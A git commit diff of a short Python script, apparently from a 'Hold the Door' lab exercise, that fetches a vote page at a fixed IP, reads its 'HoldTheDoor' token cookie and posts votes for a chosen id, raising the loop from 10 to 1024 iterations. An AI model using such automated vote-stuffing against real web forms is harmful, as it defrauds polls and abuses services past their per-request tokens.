dc15ccab0db9e0264284848cadd34ae5d848eef8
GiovanniAyala <op7puro@live.com>
2020-01-08 17:47:50 -0500

    Add Task

--- level_2/test2.py
+++ level_2/test2.py
@@ -1,16 +1,16 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 import requests
-<<<<<<< HEAD
+
 url = "http://158.69.76.135/level2.php"
 headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0', 'Referer': 'http://158.69.76.135/level2.php'}
 
 with requests.session() as client:
-    for i in range(10):
+    for i in range(1024):
         key = client.get(url)
         key_dic = key.cookies.get_dict()
         cookies = key.cookies['HoldTheDoor']
         data_post = {
-			"id": 1992221,
+			"id": 1192,
 			"holdthedoor": "Submit",
 			"key": key_dic['HoldTheDoor']
 		}
